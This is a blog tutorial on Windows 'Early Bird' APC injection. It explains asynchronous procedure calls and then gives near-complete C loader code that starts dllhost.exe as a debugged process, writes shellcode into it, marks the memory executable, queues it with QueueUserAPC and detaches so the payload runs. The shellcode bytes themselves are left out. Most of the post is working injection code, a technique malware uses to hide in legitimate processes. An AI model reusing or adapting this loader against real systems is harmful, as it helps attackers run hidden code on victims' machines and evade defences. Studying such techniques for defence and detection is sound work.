---
title: "Early Bird Injection"
author: "Adria"
date: 2024-12-13 17:30:00 +0800
categories: [Theory]
tags: [Windows,Malware]
math: true
render_with_liquid: false
---
# Early Bird Injection (APC Injection)

Asynchronous Procedure Calls (APC) Injection is an alternative to inject code without having to create another thread. 

![A cartoon-style illustration showing a bird inside a partially broken egg in a natural environment, hacking. The bird peeks its head and one wing out .webp](img/posts/EarlyBird/Bird)

# What is an APC

From Microsoft documentation, [Asynchronous Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) are functions that execute asynchronously in the context of a particular thread, this enables programs to execute tasks asynchronously while continuing to run other tasks.

For a thread to run an APAC, it needs to be in **alertable** state. When a thread is in this state, it is essentially paused, waiting for a certain condition or event, but remains open to "interruptions" from queued APCs or other signals.

When a thread is in an alertable state:

1. **It waits** for the specific condition to be met (like a signal, timeout, or event).
2. **It remains ready to execute queued APCs**: If there are any APCs queued to that thread (either kernel-mode or user-mode APCs), they will be executed while the thread is in this state.
3. **Execution continues after APCs**: Once the thread executes the queued APCs, it either resumes waiting or exits the wait function if the primary wait condition is met.

>An alertable wait state allows a thread to process asynchronous calls (APCs) while waiting, whereas a regular wait state blocks the thread entirely until the specified condition is met.
{: .prompt-info}

You can queue APC functions to other threads by using the [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) winAPI function. 

# Injecting the Payload

As mentioned above, we will use QueueUserAPC function to inject the payload into another thread. This function accepts these arguments: 

```c
DWORD QueueUserAPC(
  [in] PAPCFUNC  pfnAPC, //Address of the APC function that will be called
  [in] HANDLE    hThread, //A handle to an alertable thread
  [in] ULONG_PTR dwData //Parameters sent to the APC if needed
);
```

However, we can’t make use of this function if the thread is not in the alertable state. We can put a thread in alertable state by creating a new one and using one of the following WinAPIs: 

- [SleepEx function](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex)
- [SignalObjectAndWait function](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-signalobjectandwait)
- [WaitForSingleObjectEx function](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobjectex)
- [WaitForMultipleObjectsEx function](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitformultipleobjectsex)
- [MsgWaitForMultipleObjectsEx function](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-msgwaitformultipleobjectsex).

This only makes sense for testing purposes. In a real scenario, we want to inject the payload into another process. Since searching for threads in **alertable state** in other processes is not easy, we will use another approach. 

An alternative to threads in alertable state are threads that have been created in a **suspended** state and are still suspended.  `QueueUserAPC` can be called and the suspended thread should be resumed later. 

# Early Bird APC Injection

This methodology is used to perform a APAC injection to other processes and it consist on creating a suspended process using the `CreateProcess` WinAPI and then use a handle one of the suspended threads to perform an APC Injection. 

1. Create a suspended process by using the `CREATE_SUSPENDED` flag. 
2. Write the payload to the address space of the new target process. 
3. Get the suspended thread’s handle from `CreateProcess`  with the payload base address and pass them to `QueueUserAPC` 
4. Use the `ResumeThread` WinAPI to resume the thread so the payload will be executed

An alternative to the above steps is to create a process with `DEBUG_PROCESS` flag instead. This will make a debugged process and the debugger will be the malware process.  After injecting the payload and queuing the call, the process can be detached by calling the `DebugActiveProcessStop`  (and will resume the new process). 

# Step by Step code

In this section we will analyze a code in C that performs this early bird injection and analyze its execution. 

## Step 1: Injection Function

In our loader, we will create a function that basically injects the malicious code into victim’s memory.  This function will have the following parameters: 

- hProcess: Handle to the victim’s process.
- pShellcode: Pointer to the shellcode that we will inject.
- sSizeOfShellcode: Size of the Shellcode that we will inject.
- ppAddress: Pointer to where we can find the address memory corresponding to where the injected code has been injected.

We will define two variables, one for the number of bytes that are written to memory (`sNumberOfBytesWritten`) and another one for storing the initial memory protection configuration  (`dwOldProtectio`).  This last one is sent as parameter to the `VirtualProtectEx` function. 

Afterwards we will use `VirtualAllocEx` API to obtain memory space in the victims memory space. We will need to use the `hProcess` to interact with the victim process and `sSizeOfShellcode` to define how much space we need.  

```c
BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;
	
	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);
	
	...

```

`*ppAddress`  will now contain a pointer to the memory address from the victims process where the injected shell-code starts. 

Next, we will write the shell-code using the pointer that we obtained in the previous step. 

```c
...
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
...
```

After the memory has been written, we need to change the page protections using the `PAGE_EXECUTE_READWRITE` flag. 

```c
	...
	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```

We will use this function to inject the shell-code into the victim process once it exists.

## Step 2: Create Victim Process Function

In this step we will create another function that will handle the suspended process creation.  The function will have the following parameters: 

- lpProcessname: A variable that will contain the process name that will be executed.
- dwProcessId: A variable that we will use to store the PID of the new process.
- hProcess: A variable that we will use to store a handle of the new process.
- hThread: A variable that we will use to store a handle of a thread to the new process.

We start by creating two variables that will store the path of the process (`lpPath`) and the Windows directory OS path `WnDr`. 

Later we also create two structs that are needed to be used to call the `CreateProcessA` function. 

- `Si` - STARTUPINFO: Information related with initial configuration for the process.
- `Pi` - PROCESS_INFORMATION: Information about the process after being created.

After creating the structs, we clean its memory  using `RtlSecureZeroMemory` function to ensure they are empty.

```c
BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// cleaning the structs 
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
...
```

We will now populate the `cb` key inside the STARTUPINFO struct with its size. Since we are not doing any changes, the size is the same as the normal struct size.

Afterwards, we will populate the `WnDr` variable with the value stored in the environmental variable `%WINDIR%`. It contains the path to the Windows OS directory.  

Finally, we concatenate the `WnDr`  string with `\System32\` (where most system executables exist) and the  process name stored in `lpProcessName` . The resulting string is stored in `lpPath` .   

```c
...
	// setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

...
```

Finally, we create the process using the `CreateProcessA` function. It is important to use the `DEBUG_PROCESS` flag so the process directly starts in debug mode. If the process is correctly created, we will have its information in the `Pi` struct. Hence, we will be able to obtain the PID, and handlers to the process and threads using that struct. 

```c
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,		// Flag that will make the process to be in Debugging mode
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUTPUT parameter with 'CreateProcessA's output'
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
```

## Step 3: Putting it all together

We will finally create the `main` function where the functions defined in steps 1 and 2 will be used. 

The variables where the handlers and identifiers are stored need to be created first, then we can call the `CreateSuspendedProcess` function. We will send as parameter the global variable `TARGET_PROCESS`  that can be used to define the process, in this case the process is dllhost.exe. 

After creating the process in debugging mode, we will inject the code using the function we created in step 1 `InjectShellcodeToRemoteProcess` . 

Now that we have the process created and the payload is in its memory, we have to trigger its APC queue by using the `QueueUserAPC` call. We will send as parameters a pointer to the address where the shellcode is stored and the handle of the thread in debugging mode. 

Now we just need to detach the process from the debugging state so it will first execute the APC queue and then resume execution. To do this, we have to use the `DebugActiveProcessStop` function with the Process PID. 

```c
#define TARGET_PROCESS		"dllhost.exe"
unsigned char Payload[] = {...}

int main() {

	HANDLE		hProcess = NULL,
						hThread = NULL;

	DWORD		dwProcessId = NULL;

	PVOID		pAddress = NULL;

	//	creating target remote process (in debugged state)
	printf("[i] Creating \"%s\" Process As A Debugged Process ... ", TARGET_PROCESS);
	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n\n");

	// injecting the payload and getting the base address of it
	printf("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");

	//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

	printf("[#] Press <Enter> To Run Shellcode ... ");
	getchar();

	//	since 'CreateSuspendedProcess' create a process in debug mode,
	//	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
	printf("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessId);
	printf("[+] DONE \n\n");

	printf("[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}
```
